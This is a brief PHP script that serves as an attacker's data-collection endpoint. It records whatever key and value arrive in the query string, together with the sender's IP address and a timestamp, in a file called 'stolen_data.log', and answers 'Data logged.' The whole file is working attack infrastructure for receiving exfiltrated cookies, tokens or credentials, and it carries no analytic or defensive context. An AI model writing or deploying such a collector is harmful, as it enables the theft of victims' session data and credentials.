<?php
header('Content-Type: text/plain');
$log_file = 'stolen_data.log';

parse_str($_SERVER['QUERY_STRING'], $params);

if (empty($params)) {
    exit;
}

$log_entry = [
    'timestamp' => date('Y-m-d H:i:s'),
    'ip'        => $_SERVER['REMOTE_ADDR'],
    'type'      => key($params),
    'value'     => current($params)
];

file_put_contents($log_file, json_encode($log_entry) . "\n", FILE_APPEND);

echo "Data logged.";
?>